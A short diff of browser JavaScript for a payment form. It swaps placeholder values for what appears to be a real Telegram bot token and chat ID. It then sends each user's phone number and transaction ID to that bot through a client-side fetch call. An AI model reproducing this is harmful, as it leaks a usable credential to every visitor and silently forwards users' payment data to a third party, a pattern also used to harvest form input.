@@ -26,8 +26,8 @@ function submitPayment() {
     document.getElementById('success-popup').style.display = 'block';
     localStorage.setItem('submitLimit', parseInt(limit) + 1);
 
-    const telegramBotToken = 'YOUR_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
+    const telegramBotToken = '7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec';
+    const chatId = '7294674899';
     const message = `পেমেন্ট রিকোয়েস্ট:\nনাম্বার: ${userNumber}\nট্রানজেকশন আইডি: ${transactionId}`;
     
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
